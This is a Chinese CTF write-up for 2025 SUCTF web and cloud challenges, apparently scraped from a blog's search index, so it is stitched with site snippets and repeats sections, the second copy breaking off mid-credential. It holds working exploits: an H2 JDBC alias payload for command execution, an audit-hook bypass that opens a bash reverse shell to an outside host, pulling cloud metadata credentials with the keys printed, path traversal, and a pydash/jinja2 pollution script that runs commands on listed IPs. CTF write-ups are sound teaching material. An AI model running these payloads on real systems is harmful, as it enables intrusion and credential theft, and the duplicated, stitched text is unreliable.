GSBPPP12 AS $$ String shellexec(String cmd) throws java.io.IOException { System.setSecurityManager(null);java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$;CALL GSBPPP12(\u0026#39;command what you want execute\u0026#39;); SU_easyk8s_on_aliyun(REALLY VERY EASY) 确实是很简单的一个云渗透\n前面要从python那里拿个shell，不过有hook\nimport sys DBUG = False def audit_hook(event, args): audit_functions = { \u0026#34;os.system\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.Popen\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_output\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;_posixsubprocess.fork_exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawn\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnlp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnv\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvpe\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.fork\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;shutil.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlsym\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlopen\u0026#34;: {\u0026#34;ban\u0026#34;: True} } if event in audit_functions: if DEBUG: print(f\u0026#34;[DEBUG] found event {event}\u0026#34;) policy = audit_functions[event] if policy[\u0026#34;ban\u0026#34;]: strr = f\u0026#34;AUDIT BAN : Banning FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) raise PermissionError(f\u0026#34;[AUDIT BANNED]{event} is not allowed.\u0026#34;) else: strr = f\u0026#34;[DEBUG] AUDIT ALLOW : Allowing FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) return sys.addaudithook(audit_hook) 这里_posixsubprocess.fork_exec这个hook是抓不了的，所以它等于白写\n__import__(\u0026#39;_posixsubprocess\u0026#39;).fork_exec( [b\u0026#34;/bin/bash\u0026#34;, b\u0026#34;-c\u0026#34;, b\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/1.1.1.1/6666 0\u0026gt;\u0026amp;1\u0026#34;], [b\u0026#34;/bin/bash\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__import__(\u0026#39;os\u0026#39;).pipe()), False, False, False, None, None, None, -1, None, False ) 直接拿shell，然后用pty升级一下自己的shell\n进shell之后要信息搜集一下，这里常用思路就是用cdk_linux_amd64\n... [ Information Gathering - Net Namespace ] container net namespace isolated. [ Information Gathering - Sysctl Variables ] 2025/01/12 08:57:58 net.ipv4.conf.all.route_localnet = 1 2025/01/12 08:57:58 You may be able to access the localhost service of the current container node or other nodes. [ Information Gathering - DNS-Based Service Discovery ] error when requesting coreDNS: lookup any.any.svc.cluster.local. on 10.43.0.10:53: no such host error when requesting coreDNS: lookup any.any.any.svc.cluster.local. on 10.43.0.10:53: no such host [ Discovery - K8s API Server ] 2025/01/12 08:57:58 checking if api-server allows system:anonymous request. err found in post request, error response code: 401 Unauthorized. api-server forbids anonymous request. response:{\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;code\u0026#34;:401} [ Discovery - K8s Service Account ] service-account is available 2025/01/12 08:57:58 trying to list namespaces err found in post request, error response code: 403 Forbidden. [ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 2025/01/12 08:57:59 failed to dial Azure API. 2025/01/12 08:57:59 failed to dial Google Cloud API. 2025/01/12 08:57:59 failed to dial Tencent Cloud API. 2025/01/12 08:58:00 failed to dial OpenStack API. 2025/01/12 08:58:01 failed to dial Amazon Web Services (AWS) API. 2025/01/12 08:58:02 failed to dial ucloud API. ... 与题目名字相结合，知道了关键信息\n[ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 然后去看文档\n很明显在题目内是没有开加固模式的,我们这里直接访问就好\n然后拿到了一个ak/sk\n{ \u0026#34;AccessKeyId\u0026#34; : \u0026#34;STS.NTfZuo3n761cQMys2MNiNBo9a\u0026#34;, \u0026#34;AccessKeySecret\u0026#34; : \u0026#34;5zbrTpf6iWzMu6DdPpy42ZCj2kDfrwbte4JT9LLCQBzY\u0026#34;, \u0026#34;Expiration\u0026#34; : \u0026#34;2025-01-12T14:05:03Z\u0026#34;, \u0026#34;SecurityToken\u0026#34; : \u0026#34;CAIS1AJ1q6Ft5B2yfSjIr5fTEc/b3rEWgfOIU2vIlzIYQuZiraqSgzz2IHhMdHRqBe0ctvQ+lG5W6/4YloltTtpfTEmBc5I179Fd6VqqZNTZqcy74qwHmYS1RXadFEZYDnNszr+rIunGc9KBNnrm9EYqs5aYGBymW1u6S+7r7bdsctUQWCShcDNCH604DwB+qcgcRxCzXLTXRXyMuGfLC1dysQdRkH527b/FoveR8R3Dllb3uIR3zsbTWsH6MZc1Z8wkDovsjbArKvL7vXQOu0QQxsBfl7dZ/DrLhNaZDmRK7g+OW+iuqYU3fFIjOvVgQ/4V/KaiyKUioIzUjJ+y0RFKIfHnm/ES9DUVqiGtOpRKVr5RHd6TUxxGgmVUsD3M+Eqi7Sau0K+e5xjFvkUxaHpiA3iRUcyMsxuRQWyIEOP+y9oVsqEYoRiWu7TDSTeBK6PPRvNGUvdUGoABfmqFersd5q3sAhpi7UHmtkhuEn8jODpY4bxubpPLrQwZu7ToyzoWY9vERJzKarge1l3oM9jQP+q30t86v6WxFy2RHh97iDaIEUh3gpL9Mxu9fi4aRYzPZ2qhdZNCdWlE3CrGCuPAsoU0g3JUohJJnycnBj9o54Tdk4cTkjugEyUgAA==\u0026#34;, \u0026#34;LastUpdated\u0026#34; : \u0026#34;2025-01-12T08:05:03Z\u0026#34;, \u0026#34;Code\u0026#34; : \u0026#34;Success\u0026#34; } 很明显就是要我们去oss🪣里看flag，上去发现被删了，不过没多大问题，这里我们看之前版本的内容就好了\nSU_blog 注册接口有个任意用户密码重置的洞，这里直接用admin做用户名就能重置admin的密码了\n也省了后面爆破jwt密钥的操作\n看到article里的传参，很明显的文件路径，这里尝试一下能不能路径穿越\n发现加../和不加是一样的，猜测后端进行了replace操作\n所以试一下双写..../，然后就能读了\n读到源码和waf(waf我这里用waf\u0026hellip;/py来绕过读到)\nfrom flask import * import time, os, json, hashlib from pydash import set_ from waf import pwaf, cwaf app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\u0026#34;testuser\u0026#34;: \u0026#34;password\u0026#34;} BASE_DIR = \u0026#39;/var/www/html/myblog/app\u0026#39; articles = { 1: \u0026#34;articles/article1.txt\u0026#34;, 2: \u0026#34;articles/article2.txt\u0026#34;, 3: \u0026#34;articles/article3.txt\u0026#34; } friend_links = [ {\u0026#34;name\u0026#34;: \u0026#34;bkf1sh\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://ctf.org.cn/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;fushuling\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://fushuling.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;yulate\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.yulate.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;zimablue\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.zimablue.life/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;baozongwi\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://baozongwi.xyz/\u0026#34;} ] class User: def __init__(self): pass user_data = User() @app.route(\u0026#39;/\u0026#39;) def index(): if \u0026#39;username\u0026#39; in session: return render_template(\u0026#39;blog.html\u0026#39;, articles=articles, friend_links=friend_links) return redirect(url_for(\u0026#39;login\u0026#39;)) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if username in users and users[username] == password: session[\u0026#39;username\u0026#39;] = username return redirect(url_for(\u0026#39;index\u0026#39;)) else: return \u0026#34;Invalid credentials\u0026#34;, 403 return render_template(\u0026#39;login.html\u0026#39;) @app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def register(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] users[username] = password return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;register.html\u0026#39;) @app.route(\u0026#39;/change_password\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def change_password(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) if request.method == \u0026#39;POST\u0026#39;: old_password = request.form[\u0026#39;old_password\u0026#39;] new_password = request.form[\u0026#39;new_password\u0026#39;] confirm_password = request.form[\u0026#39;confirm_password\u0026#39;] if users[session[\u0026#39;username\u0026#39;]] != old_password: flash(\u0026#34;Old password is incorrect\u0026#34;, \u0026#34;error\u0026#34;) elif new_password != confirm_password: flash(\u0026#34;New passwords do not match\u0026#34;, \u0026#34;error\u0026#34;) else: users[session[\u0026#39;username\u0026#39;]] = new_password flash(\u0026#34;Password changed successfully\u0026#34;, \u0026#34;success\u0026#34;) return redirect(url_for(\u0026#39;index\u0026#39;)) return render_template(\u0026#39;change_password.html\u0026#39;) @app.route(\u0026#39;/friendlinks\u0026#39;) def friendlinks(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;friendlinks.html\u0026#39;, links=friend_links) @app.route(\u0026#39;/add_friendlink\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def add_friendlink(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) name = request.form.get(\u0026#39;name\u0026#39;) url = request.form.get(\u0026#39;url\u0026#39;) if name and url: friend_links.append({\u0026#34;name\u0026#34;: name, \u0026#34;url\u0026#34;: url}) return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/delete_friendlink/\u0026#39;) def delete_friendlink(index): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) if 0 \u0026lt;= index \u0026lt; len(friend_links): del friend_links[index] return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/article\u0026#39;) def article(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) file_name = request.args.get(\u0026#39;file\u0026#39;, \u0026#39;\u0026#39;) if not file_name: return render_template(\u0026#39;article.html\u0026#39;, file_name=\u0026#39;\u0026#39;, content=\u0026#34;未提供文件名。\u0026#34;) blacklist = [\u0026#34;waf.py\u0026#34;] if any(blacklisted_file in file_name for blacklisted_file in blacklist): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;大黑阔不许看\u0026#34;) if not file_name.startswith(\u0026#39;articles/\u0026#39;): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;无效的文件路径。\u0026#34;) if file_name not in articles.values(): if session.get(\u0026#39;username\u0026#39;) != \u0026#39;admin\u0026#39;: return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;无权访问该文件。\u0026#34;) file_path = os.path.join(BASE_DIR, file_name) file_path = file_path.replace(\u0026#39;../\u0026#39;, \u0026#39;\u0026#39;) try: with open(file_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() except FileNotFoundError: content = \u0026#34;文件未找到。\u0026#34; except Exception as e: app.logger.error(f\u0026#34;Error reading file {file_path}: {e}\u0026#34;) content = \u0026#34;读取文件时发生错误。\u0026#34; return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=content) @app.route(\u0026#39;/Admin\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def admin(): if request.args.get(\u0026#39;pass\u0026#39;) != \u0026#34;SUers\u0026#34;: return \u0026#34;nonono\u0026#34; if request.method == \u0026#39;POST\u0026#39;: try: body = request.json if not body: flash(\u0026#34;No JSON data received\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;No JSON data received\u0026#34;}), 400 key = body.get(\u0026#39;key\u0026#39;) value = body.get(\u0026#39;value\u0026#39;) if key is None or value is None: flash(\u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;}), 400 if not pwaf(key): flash(\u0026#34;Invalid key format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid key format\u0026#34;}), 400 if not cwaf(value): flash(\u0026#34;Invalid value format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid value format\u0026#34;}), 400 set_(user_data, key, value) flash(\u0026#34;User data updated successfully\u0026#34;, \u0026#34;success\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;User data updated successfully\u0026#34;}), 200 except json.JSONDecodeError: flash(\u0026#34;Invalid JSON data\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid JSON data\u0026#34;}), 400 except Exception as e: flash(f\u0026#34;An error occurred: {str(e)}\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: f\u0026#34;An error occurred: {str(e)}\u0026#34;}), 500 return render_template(\u0026#39;admin.html\u0026#39;, user_data=user_data) @app.route(\u0026#39;/logout\u0026#39;) def logout(): session.pop(\u0026#39;username\u0026#39;, None) flash(\u0026#34;You have been logged out.\u0026#34;, \u0026#34;info\u0026#34;) return redirect(url_for(\u0026#39;login\u0026#39;)) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=10000) 除了之前用到的接口，只剩下一个/Admin\n这里有一个原型链污染，不过题目要我们RCE，所以我们要结合一下jinja2的一个模版渲染\nhttps://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/\nwaf里数字只剩下2，也是指引我们打jinja2\n我们还需要获取sys模块，上面文章链接中的一个payload是用了__loader__，但是这题被ban了\n那我们只能用__spec__来代替__loader__来获取到sys模块\n因为模版编译只在第一次访问时才编译，所以要卡容器重启的第一时间才能打通\nexp\nimport requests import multiprocessing js = { \u0026#34;key\u0026#34;: \u0026#34;__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;*;import os;os.system(\u0026#39;/read\\\\x66lag \u0026gt; /tmp/f\u0026#39;)\u0026#34;} def brute(url): while True: try: res = requests.post(url + \u0026#34;/Admin?pass=SUers\u0026#34;, json=js) print(url + \u0026#34;:\u0026#34; + res.text) requests.get(url + \u0026#34;/Admin?pass=SUers\u0026#34;) requests.get(url + \u0026#34;/\u0026#34;) requests.get(url + \u0026#34;/login\u0026#34;) requests.get(url + \u0026#34;/register\u0026#34;) except Exception as e: print(e) if __name__ == \u0026#39;__main__\u0026#39;: urls=[\u0026#34;http://27.25.151.48:10000\u0026#34;, \u0026#34;http://27.25.151.48:10001\u0026#34;, \u0026#34;http://27.25.151.48:10002\u0026#34;, \u0026#34;http://27.25.151.48:10003\u0026#34;, \u0026#34;http://27.25.151.48:10004\u0026#34;, \u0026#34;http://27.25.151.48:10005\u0026#34;] for url in urls: p = multiprocessing.Process(target=brute, args=(url,)) p.start() SU_photogallery 由404页面可以很明显的知道是一个临时服务php -S开启的\n再根据去年出的一个洞，由php -S开启的服务在特定版本下能够读取源码\nhttps://cloud.tencent.com/developer/article/2235691\n所以这里也是有模学样的拿到源码\n后续打的时候碰到别人写的shell，然后用源码泄漏看参数就直接打进去了(这也是公共环境做题思路的一部分叭xsl)\n","date":"2025-01-18T19:38:41+08:00","permalink":"http://localhost:1313/post/2025suctf/","section":"post","tags":null,"title":"2025-SUCTF-WP"},{"categories":null,"contents":" 1231 456 友链名称2 友链描述2 ","date":"2025-01-18T01:22:01+08:00","permalink":"http://localhost:1313/friend/","section":"","tags":null,"title":"友链"},{"categories":null,"contents":"一名大二在读学生\nSyclover \u0026amp; 0XFFF 成员\n对各种安全感兴趣，目前主要学习的还的是Web安全（Java 安全、云安全等）\n最爱吃，最喜欢吃的是🍉，最喜欢干的事情就是大夏天抱着半个西瓜拿勺子挖着吃然后看视频\n会打点小游戏（其实从小学之前就开始打游戏了hh\n什么都想学，但什么都不会\nContact Me Email:gsbp6279@gmail.com\nGitHub:https://github.com/GSBP0/:\n","date":"2025-01-17T19:38:41+08:00","permalink":"http://localhost:1313/about/","section":"","tags":null,"title":"About Me"},{"categories":null,"contents":"SU_ez_solon 题目直接给了个hessian反序列化的接口\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.example.demo.controller; import com.caucho.hessian.io.Hessian2Input; import java.io.ByteArrayInputStream; import java.util.Base64; import org.noear.solon.annotation.Controller; import org.noear.solon.annotation.Mapping; import org.noear.solon.annotation.Param; @Controller public class IndexController { public IndexController() { } @Mapping(\u0026#34;/hello\u0026#34;) public String hello(@Param(defaultValue = \u0026#34;hello\u0026#34;) String data) throws Exception { byte[] decode = Base64.getDecoder().decode(data); Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(decode)); Object object = hessian2Input.readObject(); return object.toString(); } } 不过他这个反序列化还给了一个toString()的调用\n然后再观察一下给的依赖\n... \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hessian\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.5\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa.common\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;sofa-common-tools\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.83\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.h2database\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;h2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.2.224\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; h2和fastjson这俩依赖写一起的，再加上上面的toString(),指向型很强了,就是让我们利用fastjson的getter打一个JDBC攻击\n做题过程 做题的时候找了有几个能打通的类，但都因为sofa-hessian自带的反序列化名单被做掉了\n我们需要知道在打h2的jdbc时，最后都会走向哪个类的哪个方法\norg.h2.jdbc.JdbcConnection.JdbcConnection()\n就是JdbcConnection的构造方法，以此为根据去找哪些getter会实例化一个JdbcConnection类\n这里可以写codeql来找，我有点懒没咋写，这里写我找到的两个方法\norg.h2.jdbcx.JdbcDataSource.getConnection() org.noear.solon.data.util.UnpooledDataSource 第一个被黑名单ban了，但是它给了我们些许灵感，JdbcDataSource类实现了DataSource接口，继承这个接口的类都要重写getConnection()方法，所以我们可以去根据继承关系来寻找适合的方法\n所以我们找到了UnpooledDataSource方法，即不在黑名单上，而且他的构造方法和getConnection也很有意思\npublic UnpooledDataSource(String url, String username, String password, String driverClassName) { if (Utils.isEmpty(url)) { throw new IllegalArgumentException(\u0026#34;Invalid ds url parameter\u0026#34;); } else { this.logWriter = new PrintWriter(System.out); this.url = url; this.username = username; this.password = password; this.setDriverClassName(driverClassName); } } public Connection getConnection() throws SQLException { return this.username == null ? DriverManager.getConnection(this.url) : DriverManager.getConnection(this.url, this.username, this.password); } 构造方法会自动根据你的driverClassName来注册对应驱动类，然后getConnection()也会直接从DriverManager中进行Connection操作，泛用性很强\n然后后面常规打h2RCE的思路了，有一个SecurityManager要绕，其实直接调用setSecurityManager(null)就好了\npublic static void main(String[] args) throws Exception{ UnpooledDataSource unpooledDataSource = new UnpooledDataSource(\u0026#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \u0026#39;http://127.0.0.1:8000/poc.sql\u0026#39;\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;org.h2.Driver\u0026#34;); unpooledDataSource.setLogWriter(null); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;xx\u0026#34;, unpooledDataSource); String payload =Util.hessianSerialize(jsonObject); System.out.println(URLEncoder.encode(payload, \u0026#34;UTF-8\u0026#34;)); Util.hessianDeserialize(payload); } poc.sql\nCREATE ALIAS GSBPPP12 AS $$ String shellexec(String cmd) throws java.io.IOException { System.setSecurityManager(null);java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$;CALL GSBPPP12(\u0026#39;command what you want execute\u0026#39;); SU_easyk8s_on_aliyun(REALLY VERY EASY) 确实是很简单的一个云渗透\n前面要从python那里拿个shell，不过有hook\nimport sys DBUG = False def audit_hook(event, args): audit_functions = { \u0026#34;os.system\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.Popen\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_output\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;_posixsubprocess.fork_exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawn\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnlp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnv\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvpe\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.fork\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;shutil.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlsym\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlopen\u0026#34;: {\u0026#34;ban\u0026#34;: True} } if event in audit_functions: if DEBUG: print(f\u0026#34;[DEBUG] found event {event}\u0026#34;) policy = audit_functions[event] if policy[\u0026#34;ban\u0026#34;]: strr = f\u0026#34;AUDIT BAN : Banning FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) raise PermissionError(f\u0026#34;[AUDIT BANNED]{event} is not allowed.\u0026#34;) else: strr = f\u0026#34;[DEBUG] AUDIT ALLOW : Allowing FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) return sys.addaudithook(audit_hook) 这里_posixsubprocess.fork_exec这个hook是抓不了的，所以它等于白写\n__import__(\u0026#39;_posixsubprocess\u0026#39;).fork_exec( [b\u0026#34;/bin/bash\u0026#34;, b\u0026#34;-c\u0026#34;, b\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/1.1.1.1/6666 0\u0026gt;\u0026amp;1\u0026#34;], [b\u0026#34;/bin/bash\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__import__(\u0026#39;os\u0026#39;).pipe()), False, False, False, None, None, None, -1, None, False ) 直接拿shell，然后用pty升级一下自己的shell\n进shell之后要信息搜集一下，这里常用思路就是用cdk_linux_amd64\n... [ Information Gathering - Net Namespace ] container net namespace isolated. [ Information Gathering - Sysctl Variables ] 2025/01/12 08:57:58 net.ipv4.conf.all.route_localnet = 1 2025/01/12 08:57:58 You may be able to access the localhost service of the current container node or other nodes. [ Information Gathering - DNS-Based Service Discovery ] error when requesting coreDNS: lookup any.any.svc.cluster.local. on 10.43.0.10:53: no such host error when requesting coreDNS: lookup any.any.any.svc.cluster.local. on 10.43.0.10:53: no such host [ Discovery - K8s API Server ] 2025/01/12 08:57:58 checking if api-server allows system:anonymous request. err found in post request, error response code: 401 Unauthorized. api-server forbids anonymous request. response:{\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;code\u0026#34;:401} [ Discovery - K8s Service Account ] service-account is available 2025/01/12 08:57:58 trying to list namespaces err found in post request, error response code: 403 Forbidden. [ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 2025/01/12 08:57:59 failed to dial Azure API. 2025/01/12 08:57:59 failed to dial Google Cloud API. 2025/01/12 08:57:59 failed to dial Tencent Cloud API. 2025/01/12 08:58:00 failed to dial OpenStack API. 2025/01/12 08:58:01 failed to dial Amazon Web Services (AWS) API. 2025/01/12 08:58:02 failed to dial ucloud API. ... 与题目名字相结合，知道了关键信息\n[ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 然后去看文档\n很明显在题目内是没有开加固模式的,我们这里直接访问就好\n然后拿到了一个ak/sk\n{ \u0026#34;AccessKeyId\u0026#34; : \u0026#34;STS.NTfZuo3n761cQMys2MNiNBo9a\u0026#34;, \u0026#34;AccessKeySecret\u0026#34; : \u0026#34;5zbrTpf6iWzMu6DdPpy42ZCj2kDfrwbte4JT9LLCQBzY\u0026#34;, \u0026#34;Expiration\u0026#34; : \u0026#34;2025-01-12T14:05:03Z\u0026#34;, \u0026#34;SecurityToken\u0026#34; : 